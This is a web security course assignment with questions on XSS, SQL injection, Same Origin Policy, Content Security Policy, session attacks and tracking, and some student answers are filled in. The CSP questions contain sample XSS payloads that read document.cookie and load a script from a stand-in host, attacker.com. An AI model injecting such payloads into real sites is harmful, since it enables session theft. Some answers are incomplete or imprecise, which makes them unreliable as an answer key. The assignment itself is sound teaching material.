# Assignment 2 – Oh What a Tangled Web We Weave

## Contents

* [Code Injection](#code-injection "Jump To Section")

* [Same Origin Policy](#same-origin-policy "Jump To Section")

* [Content Security Policy](#content-security-policy "Jump To Section")

* [Section Attacks](#session-attacks "Jump To Section")

* [Fingerprinting](#fingerprinting "Jump To Section")

---

## Code Injection

1. You and a friend built a site that accepts and displays user-generated content. You recently read the [XKCD comic about code injection](https://xkcd.com/327/ "Code Injection Comic") which made you realize that you're not sanitizing user-submitted data anywhere in your web app. You realize that you're almost certainly vulnerable to Cross site scripting (XSS) and SQL injection attacks – yikes!

    Rereading the comic, you notice it ends with the phrase "I hope you've learned to sanitize your database inputs". Your friend suggests solving the issue by escaping all user-submitted data before inserting it into the database. Your friend argues that by sanitizing the inputs to the database as the comic suggests, the data can then be extracted from the database and safely used in HTML and SQL without further escaping.

    Is this a valid argument? (Yes/No) Why or why not?

    > No. Inputs should be sanitized before being placed into the database but they should also be properly sanitized (encoded) for whatever context they will be placed in. For instance, if the context is into HTML then the output should be properly encoded for HTML.

2. You and a friend decide to build an internal dashboard that will show real-time HTTP requests that are being sent by visitors to your site. The dashboard displays information about each HTTP request received by the web server, including the client's IP address, HTTP method, URL, query parameters, referrer URL, and user agent name.

    Incidentally, this is the exact set of information that most popular web servers like Nginx or Apache print into the server log files. Here is what one line from such a log file looks like:

    ```
    12.34.56.78 - - [17/Oct/2019:05:01:59 +0000] "GET /api/midi/search?q=hi&page=0 HTTP/1.0" 200 178 "hxxps://example[.]com/search?q=h" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
    ```

    The internal dashboard will only be used by you and your friend and will not be exposed to the broader internet since the logs reveal information about your site visitors. Your friend argues that there is no need to worry about XSS vulnerabilites in an internal-only dashboard since neither of you would create an XSS attack to use against the other. Given that, they see no way that an XSS attack could occur.

    Is this a valid argument? (Yes/No) Why or why not?

    > No. It doesn't matter wether the dashboard is internal or not. A successful XSS payload can be created that exfiltrates data to an external server by manipulating the URL, query parameters, user agent name or referer header. Although the dashboard itself is only used internally, the data itself is being provided by the user. 

3. Name a real-world case where adherence to the Robustness principle (a.k.a. Postel's law) caused a system to have worse security. Explain how the Robustness principle led to the system having worse security properties.

    > Postel's law states that you should "be conservative in what you do, be liberal in what you accept from others", meaning that you should accept all data that you can understand, but be careful in how you proccess it. While the idea may seem good, it can lead to unintended consequences where data is interpreted in a different way than was originally intended, causing quirky behavior or being leveraged by attackers. One example of this in the real world, occured in 2009 when SSL certificate authorities were issuing certificates for web domains that contained the ASCII null character. Malicious groups were taking advantage of this behaviour by registering domains such as "gmail.com0.attacker.com". While this should have considered a sub-domain of "attacker.com", many browsers interpreted the certificate as belonging to Google. For more on this example read the following article:

    ["Postel's Law and Network Security" by Trevor Jim](http://trevorjim.com/postels-law-and-network-security/ "Article on Postels Law by Trevor Jim")

[BACK TO TOP](#assignment-2-–-oh-what-a-tangled-web-we-weave "Jump To Top")

---

## Same Origin Policy

4. Name three ways that the Same Origin Policy protects a website.

    > By not allowing access to the contents of an iframe unless they are from the same origin.

    > By not allowing XMLHttpRequests.

    > By not allowing cookies to be accessed by pages with a different origin.

5. Can JavaScript code running on attacker.com cause a GET request to be sent to a URL on victim.com? (Yes/No)

6. Can JavaScript code running on attacker.com use the fetch() API to send a GET request to victim.com and read the HTTP response body? (Yes/No)

7. Assume no CORS headers are present on the response.

8. Can JavaScript code running on attacker.com submit a form that sends a POST request to victim.com? (Yes/No)

9. A fascinating Same origin policy "bypass" was described in ["Cross-Origin JavaScript Capability Leaks: Detection, Exploitation, and Defense"](https://www.usenix.org/conference/usenixsecurity09/technical-sessions/presentation/cross-origin-javascript-capability-leaks "Usenix Talk"), a talk at USENIX '09 (one of the top security conferences). How could an attacker use this browser implementation bug to bypass the same origin policy? What was the key, underlying reason for the bug? What was the proposed mitigation? Please keep your answer to 200 words or fewer.

[BACK TO TOP](#assignment-2-–-oh-what-a-tangled-web-we-weave "Jump To Top")

---

## Content Security Policy

9. An attacker takes advantage of a vulnerability in your site to inject an XSS payload into the HTML page sent by your server. Fortunately, you set up a CSP in case this happened because you follow a defense-in-depth security approach.

    Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: script-src 'self';
    ```

    ```html
    <script>alert(document.cookie)</script>
    ```

10. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: default-src *; script-src 'self';
    ```

    ```html
    <script>alert(document.cookie)</script>
    ```

11. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'self'; img-src 'self'; style-src 'self';
    ```

    ```html
    <script>alert(document.cookie)</script>
    ```

12. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'self'; img-src 'self'; style-src 'self';
    ```

    ```html
    <script>eval('alert(document.cookie)')</script>
    ```

13. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: default-src *; script-src 'self'; connect-src *; img-src *; style-src *;
    ```

    ```html
    <script src='https://attacker.com/xss.js'></script>
    ```

14. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: default-src 'none'; script-src 'self' https:; connect-src 'none'; img-src 'none'; style-src 'none';
    ```

    ```html
    <script src='https://attacker.com/xss.js'></script>
    ```

15. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: script-src 'self' 'nonce-R28gU3RhbmZvcmQh';
    ```

    ```html
    <script>alert(document.cookie)</script>
    ```

16. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: script-src 'self' 'nonce-R28gU3RhbmZvcmQh';
    ```

    ```html
    <script nonce='xss'>alert(document.cookie)</script>
    ```

17. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: script-src 'self' 'nonce-R28gU3RhbmZvcmQh' 'unsafe-inline';
    ```

    ```html
    <script nonce='xss'>alert(document.cookie)</script>
    ```

18. Would the following CSP prevent the XSS attack? (Yes/No)

    Why or why not?

    ```http
    Content-Security-Policy: script-src 'self';
    ```

    ```html
    <script src='/api/echo?str=alert(document.cookie)'></script>
    ```

    Where /api/echo is a working API endpoint on the victim webserver that replies back with whatever string it receives in the str query parameter. For example, the URL /api/echo?str=hello returns an HTTP response with a body of hello.

    In case it makes a difference, you can assume the API response has a Content-Type header with a value of text/plain.

19. Assume that victim.com is protected with the following CSP:

    ```http
    Content-Security-Policy: script-src 'self' 'nonce-<nonce-value-here>';
    ```

    The operator of attacker.com attempts to subvert victim.com's CSP by visitng victim.com and copying the nonce they observe in the CSP header into their XSS attack payload:

    ```html
    <script nonce='<nonce-value-here>'>alert(document.cookie)</script>
    ```

20. Read the paper ["CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"](https://research.google/pubs/pub45542/ "CSP Is Dead Research Paper"). Explain the problem that 'strict-dynamic' keyword solves.

[BACK TO TOP](#assignment-2-–-oh-what-a-tangled-web-we-weave "Jump To Top")

---

## Session Attacks

21. How does adding the SameSite=Lax cookie attribute protect a website against CSRF attacks? Give a concrete example of an attack scenario that it prevents.

22. Why is it important to not only delete the user's session cookie when they log out, but to also delete the session on the server side (i.e. delete it from the database)? Specifically, what could an attacker do if a server didn't delete the session on the server side after logout?

[BACK TO TOP](#assignment-2-–-oh-what-a-tangled-web-we-weave "Jump To Top")

---

## Fingerprinting

23. Explain how a tracker could use third-party cookies and an image request to a pixel.gif image to identify a user on two separate domains.

24. Explain how "partitioning" or "double-keying" the browser storage (such as cookies and localStorage) helps to prevent web tracking. What tracker behavior does it prevent? How does double-keying prevent this behavior?

[BACK TO TOP](#assignment-2-–-oh-what-a-tangled-web-we-weave "Jump To Top")
